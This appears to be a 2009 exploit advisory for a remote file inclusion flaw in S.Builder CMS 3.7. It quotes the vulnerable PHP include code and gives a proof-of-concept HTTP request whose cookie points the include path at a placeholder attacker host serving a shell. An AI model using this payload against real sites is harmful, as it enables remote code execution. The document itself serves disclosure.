@@ -1,0 +1,40 @@
+CMS S.Builder <= 3.7 RFI Vulnerability
+
+
+Information:
+
+Vendor: http://www.sbuilder.ru
+Affected versions: 3.7 and possibly later versions
+
+
+Description:
+
+The engine of this cms makes site files (index.php, etc) with code like:
+
+---[ PHP Code:
+
+if (!isset($GLOBALS['binn_include_path'])) $GLOBALS['binn_include_path'] = '';
+...
+include_once($GLOBALS['binn_include_path'].'prog/pl_menu/show_menu.php');
+...
+
+-----
+
+If register_globals=On, attacker can write remote url (if allow_url_fopen=On) or local path into variable binn_include_path.
+
+
+PoC:
+
+---[ HTTP Request:
+
+GET /index.php HTTP/1.1
+Host: www.site.com
+Cookie: binn_include_path=http://evil.site.com/shell.txt?
+
+-----
+
+
+# by cr0w 
+# http://cr0w-at.blogspot.com
+
+# milw0rm.com [2009-03-09]
